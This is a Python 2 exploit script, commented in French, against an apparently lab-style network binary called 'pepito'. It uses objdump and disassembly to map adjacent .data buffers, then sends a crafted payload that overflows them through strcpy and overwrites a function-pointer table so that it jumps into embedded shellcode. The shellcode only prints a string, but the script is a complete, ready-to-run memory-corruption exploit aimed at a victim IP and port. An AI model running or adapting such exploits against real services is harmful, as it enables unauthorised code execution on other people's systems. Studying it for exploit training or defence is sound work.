#!/usr/bin/env python2
# sploit le strcpy pour depasser sur le tableau guestBook et password pour attendre
# le tableau de pointeur sur fonction de handlerTab

# $>objdump -x ../../../src/pepito_jo/pepito | grep handlerTab
# 0804ae80 l     O .data	00000014              handlerTab
# $> objdump -x ../../../src/pepito_jo/pepito | grep password
# 0804ac80 l     O .data	00000200              password
# $> objdump -x ../../../src/pepito_jo/pepito | grep guestBook
# 0804aa80 l     O .data	00000200              guestBook

# Ok donc nous avons en premier notre tableau guestBook ensuite notre tableau de password
# puis nous tapons apres dans le tableau de handlerTab

# Constitution du tableau handlerTab
# +====================================================================
# | 804ae80
# | .......   ;********************************************************
# | .......   ; data object handlerTab, size 20 (local)
# | .......   ;********************************************************
# | .......   handlerTab:                     ;xref r8048e77
# | .......     dd          08048bcah
# | 804ae84     db          77h ; 'w'
# | 804ae85     db          8ch ; '?'
# | 804ae86     db          04h ; ' '
# | 804ae87     db          08h ; ' '
# | 804ae88     db          91h ; '?'
# | 804ae89     db          8dh ; '?'
# | 804ae8a     db          04h ; ' '
# | 804ae8b     db          08h ; ' '
# | 804ae8c     db          33h ; '3'
# | 804ae8d     db          8dh ; '?'
# | 804ae8e     db          04h ; ' '
# | 804ae8f     db          08h ; ' '
# | 804ae90     db          00h ; ' '
# | 804ae91     db          00h ; ' '
# | 804ae92     db          00h ; ' '
# | 804ae93     db          00h ; ' '

import socket
import os
import time
import sys

if len(sys.argv) != 3:
   print "[-] Syntax: ./sploit.py <ip_victime> <port>"
   sys.exit(1)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

# 08048054 <.text>:
# 8048054:	55                   	push   %ebp
# 8048055:	89 e5                	mov    %esp,%ebp
# 8048057:	31 c0                	xor    %eax,%eax
# 8048059:	31 db                	xor    %ebx,%ebx
# 804805b:	31 c9                	xor    %ecx,%ecx
# 804805d:	31 d2                	xor    %edx,%edx
# 804805f:	b2 10                	mov    $0x10,%dl
# 8048061:	68 6f 72 67 0a       	push   $0xa67726f
# 8048066:	68 6f 72 6d 2e       	push   $0x2e6d726f
# 804806b:	68 6e 2d 73 74       	push   $0x74732d6c
# 8048070:	68 73 68 65 6e       	push   $0x6c656873
# 8048075:	89 e1                	mov    %esp,%ecx
# 8048077:	b3 01                	mov    $0x1,%bl
# 8048079:	b0 04                	mov    $0x4,%al
# 804807b:	cd 80                	int    $0x80
# 804807d:	c9                   	leave
# 804807e:	c3                   	ret

shellcode = "\x55\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2" \
            "\xb2\x10\x68\x6f\x72\x67\x0a\x68\x6f\x72\x6d" \
            "\x2e\x68\x6c\x2d\x73\x74\x68\x73\x68\x65\x6c" \
            "\x89\xe1\xb3\x04\xb0\x04\xcd\x80\xc9\xc3"

password    = shellcode
size        = len(shellcode)
password   += "\x90" * (512 - size)
guestBook   = "A" * 512
handlerTab  = "\x80\xac\x04\x08" # tab[0]
handlerTab += "\x80\xac\x04\x08" # tab[1]
handlerTab += "\x80\xac\x04\x08" # tab[2]
handlerTab += "\x80\xac\x04\x08" # tab[3]
cmdID       = "1"
arg2        = str(len(guestBook) + len(password) + len(handlerTab) + 1)
payload     = cmdID + " " + arg2 + guestBook + password + handlerTab

print "[+] Try to send payload"
try:
   s.send(payload)
   s.close
except:
   print "[-] Error send payload1"
   sys.exit(1)

print "[+] binary patched!"
sys.exit(0)
